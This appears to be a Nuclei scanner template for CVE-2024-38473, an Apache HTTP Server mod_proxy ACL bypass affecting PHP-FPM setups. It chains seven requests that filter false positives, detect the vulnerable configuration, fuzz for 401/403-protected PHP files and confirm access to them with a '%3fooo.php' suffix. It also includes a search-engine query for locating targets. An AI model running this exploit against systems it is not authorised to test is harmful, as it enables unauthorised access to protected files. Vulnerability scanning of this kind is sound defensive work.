id: CVE-2024-38473

info:
  name: Apache HTTP Server - ACL Bypass
  author: Orange Tsai
  severity: high
  description: Encoding problem in mod_proxy in Apache HTTP Server 2.4.59 and earlier allows request URLs with incorrect encoding to be sent to backend services, potentially bypassing authentication via crafted requests.
  remediation: Fixed in v2.4.60
  reference:
    - https://blog.orange.tw/2024/08/confusion-attacks-en.html#%E2%9A%94%EF%B8%8F-Primitive-1-2-ACL-Bypass
    - https://www.cvedetails.com/cve/CVE-2024-38473/
    - https://nvd.nist.gov/vuln/detail/CVE-2024-38473
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H
    cvss-score: 8.1
    cve-id: CVE-2024-38473
    cwe-id: CWE-116
    epss-score: 0.04
    epss-percentile: 9
    cpe: cpe:/a:apache:http_server, cpe:/a:apache:httpd
  metadata:
    max-request: 10
    vendor: Apache Software Foundation
    product: Apache HTTP Server
    google-query: intitle:"Apache HTTP Server" inurl:"/server-status"
  tags: cve, apache, acl-bypass, mod_proxy, php-fpm


flow:
  http(1) && http(2) && http(3) && http(4) && http(5) && http(6) && http(7)
  

http:

   # Request 1: Request a non-existent file to filter out false positives in cases where 
   # index.php%3fooo.php returns a 200 status code and the same body as index.php, even when 
   # PHP-FPM is not configured. This could occur, for example, when there are rules that 
   # rewrite any requested file or files that start with "index" to index.php, such as:
    
   # RewriteRule . /index.php [L]
   # RewriteRule ^index\.php(.*)$ index.php [L]
   # RewriteRule ^index(.*)$ index.php [L]
   
   # The following request should return a 200 status code if the server has rules like 
   # the ones mentioned above, or a 404 status code in normal cases where PHP-FPM might 
   # be configured.
  
  - method: GET
    path:
      - "{{RootURL}}{{Path}}/index.phpooo.php%3fooo.php"
 
    matchers:
      - type: status
        status:
          - 404
        internal: true 



   # Request 2: Request a non-existent file to filter out false positives in cases where 
   # index.html%3fooo.php returns a 403 status code, even when PHP-FPM is not configured. 
   # This could occur, for example, when there are rules that prohibit the %3f character 
   # anywhere in the URL or that restrict access to files ending with .php. 
   # Examples of such rules include:
   
   # <FilesMatch "\.php$">
   #   Require all denied
   # </FilesMatch>
  
   # RewriteCond %{REQUEST_URI} (%3f)
   # RewriteRule ^(.*)$ - [F]
   
   # The following request should return a 403 status code if the server has rules like 
   # the ones mentioned above, or a 404 status code in normal cases where PHP-FPM might 
   # be configured.
   
  - method: GET
    path:
      - "{{RootURL}}{{Path}}/foo.phpooo.php%3fooo.php"
    
    matchers:
      - type: status
        status:
          - 404
        internal: true



   # Request 3: Requests to identify some available file on the server.
  
  - method: GET
    path:
      - "{{RootURL}}{{Path}}/{{fuzz}}"
    
    payloads:
      fuzz:
        - index.php
        - index.html
        - index.htm
        - "{{File}}"

    attack: batteringram
    threads: 1
    stop-at-first-match: true
        
    matchers:
      - type: status
        status:
          - 200
        internal: true

   
   
   # Request 4: Request a non-existent file to filter out the last false positives in cases where 
   # index.php%3fooo.php returns a 200 status code and the same body as index.php, even when 
   # PHP-FPM is not configured. 
   
   # Some web servers, especially those that are not Apache, ignore everything following the %3f. 
   # Therefore, if we send index.php%3fooo.php, the server treats it as index.php. To filter these 
   # cases, we send a request to index.php%3fooo.html (if index.php was found on the server) or 
   # index.html%3fooo.html (if index.html was found on the server). Since it ends with .html, in 
   # normal cases where PHP-FPM might be configured, it would not be processed by PHP-FPM and would 
   # be treated as a static file that logically does not exist, resulting in a 404 status code. 
   # However, it would return a 200 status code in cases we want to filter, where everything following 
   # the %3f is ignored.

  - method: GET
    path:
      - "{{RootURL}}{{Path}}/{{http_3_fuzz}}%3fooo.html"
 
    matchers:
      - type: status
        status:
          - 404
        internal: true    
     
     
     
   # Request 5: Request to identify the vulnerable configuration. There are 2 cases:
   
   # Case 1:
   # In Request 3, index.php was found. In this case, if Apache < 2.4.60 and
   # PHP-FPM is enabled with the default configuration, it should strip the %3fooo.php
   # part and load index.php, resulting in a 200 response with the same length as obtained 
   # in Request 3. If mod_php or another handler is used, it would treat index.php%3fooo.php 
   # as the full file name and return a 404.
   
   # Case 2:
   # In Request 3, index.html was found. In this case, if Apache < 2.4.60 and
   # PHP-FPM is enabled with the default configuration, it should strip the %3fooo.php
   # part and attempt to load index.html, which would return a 403 Access Denied, as PHP-FPM
   # would be trying to load a file with a disallowed extension. If mod_php or another handler
   # is used, it would treat index.php%3fooo.php as the full file name and return a 404.
  
  - method: GET
    path:
      - "{{RootURL}}{{Path}}/{{http_3_fuzz}}%3fooo.php" 
      
    matchers:
      - type: dsl
        dsl:
          - "len(http_3_body)==len(body) && status_code==200 && contains(http_3_fuzz, '.php')"
          - "status_code==403 && contains(http_3_fuzz,'.htm')"
        condition: or
        
    extractors:
      - type: dsl
        dsl:
          - '"[*] Vulnerable Apache < 2.4.60 with PHP-FPM detected!"'
          


   # Request 6: Requests to fuzz for potential restricted files that return a 403 status code or
   # require authentication and return a 401 status code.

  - method: GET
    path:
      - "{{RootURL}}{{Path}}/{{fuzz}}"
        
    payloads:
      fuzz: wordlists/potential_protected_php_files_10.txt
      #fuzz: wordlists/potential_protected_php_files_350.txt

    attack: batteringram
    threads: 1
    stop-at-first-match: true
    
    matchers:
      - type: status
        status:
        - 403
        - 401
        condition: and
        internal: true  
          
          
          
   # Request 7: Request to validate that the restricted file from Request 6 returns a 200
   # status code with the bypass.

  - method: GET
    path:
      - "{{RootURL}}{{Path}}/{{http_6_fuzz}}%3fooo.php"
          
    matchers:
      - type: status
        status:
          - 200
          
    extractors:
      - type: dsl
        dsl:
          - '"[*] ACL BYPASS FOUND! " + BaseURL + "/" + http_6_fuzz +"%3fooo.php"'
